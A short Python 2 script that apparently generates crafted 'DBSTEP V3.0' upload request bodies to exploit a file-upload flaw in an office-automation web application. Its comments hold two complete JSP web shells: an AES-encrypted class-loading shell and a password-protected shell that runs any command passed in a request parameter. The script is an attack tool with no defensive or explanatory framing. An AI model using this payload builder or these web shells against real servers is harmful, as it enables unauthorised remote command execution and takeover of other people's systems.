while(1):
    # FILENAME = "qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATddA0jcQhUcATRnYd5NrJ3"
    FILENAME=raw_input("path= ")
    # filename = '''<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>'''
    # filename = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd33445".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>'''
    filename=raw_input("filename= ")
    
    for i in xrange(300,400):
        a= 'DBSTEP V3.0     %s             0               %s             DBSTEP=OKMLlKlV\nOPTION=S3WYOSWLBSGr\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\nCREATEDATE=wUghPB3szB3Xwg66\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\noriginalFileId=wV66\noriginalCreateDate=wUghPB3szB3Xwg66\nFILENAME=%s\nneedReadFile=yRWZdAS6\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\n%s' % (i, len(filename), FILENAME, filename)
        a.replace("\n","\r\n")
        if a.find("File=") == i:
            print
            print a
            print "-"*50
